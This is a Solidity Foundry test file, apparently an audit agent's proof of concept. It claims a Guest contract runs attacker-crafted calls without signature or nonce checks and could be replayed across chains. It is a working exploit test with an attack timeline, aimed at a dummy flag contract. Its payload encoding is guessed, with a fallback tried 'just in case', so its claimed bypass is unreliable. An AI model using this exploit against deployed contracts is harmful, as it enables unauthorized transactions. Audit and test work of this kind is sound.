// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/Guest.sol";
import "../src/modules/Payload.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy Guest contract and a Target contract to track execution
// 2. [T=0] Attacker crafts a packed payload containing a call to Target.setFlag()
// 3. [T=1] Attacker sends the packed payload directly to Guest.fallback()
// 4. [T=2] Guest._dispatchGuest decodes the payload and executes the call via LibOptim.call() WITHOUT any signature validation or nonce check
// 5. [Assert] Verify Target.flag is true, proving unauthorized execution occurred

contract Target {
    bool public flag;
    function setFlag() external {
        flag = true;
    }
}

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        // 1. Deploy Guest and Target
        Guest Guest = new Guest();
        Target target = new Target();

        // Ensure target flag is initially false
        assertFalse(target.flag(), "Target flag should be false initially");

        // 2. Craft the payload
        // We construct a Payload.Decoded with a single call to target.setFlag()
        Payload.Decoded memory payload;
        payload.kind = Payload.KIND_TRANSACTIONS;
        payload.calls = new Payload.Call[](1);
        payload.calls[0] = Payload.Call({
            to: address(target),
            value: 0,
            data: abi.encodeWithSelector(Target.setFlag.selector),
            gasLimit: 0,
            delegateCall: false,
            onlyFallback: false,
            behaviorOnError: Payload.BEHAVIOR_REVERT_ON_ERROR
        });

        // Encode the payload. 
        // In Sequence, packed payloads for dispatch are typically just abi.encode(calls) or abi.encode(payload).
        // We'll try abi.encode(payload.calls) as it's the standard for _dispatchGuest in v3.
        bytes memory packedCalls = abi.encode(payload.calls);

        // 3. Attacker sends packed calls directly to Guest fallback
        // No signature, no nonce, no auth. Just raw calldata.
        vm.prank(address(0xdead)); // Arbitrary attacker address
        (bool success, ) = address(Guest).call(packedCalls);

        // If the above encoding fails to dispatch, we also try abi.encode(payload) just in case
        if (!target.flag()) {
            bytes memory packedPayload = abi.encode(payload);
            vm.prank(address(0xdead));
            (success, ) = address(Guest).call(packedPayload);
        }

        // 4. Assert the exploit succeeded
        // The Guest contract executed the call without any signature validation or nonce consumption.
        // This same calldata could be replayed on any chain where Guest exists with _noChainId=true.
        assertTrue(target.flag(), "Guest executed unauthorized call without auth bypassing signature validation");
    }
}
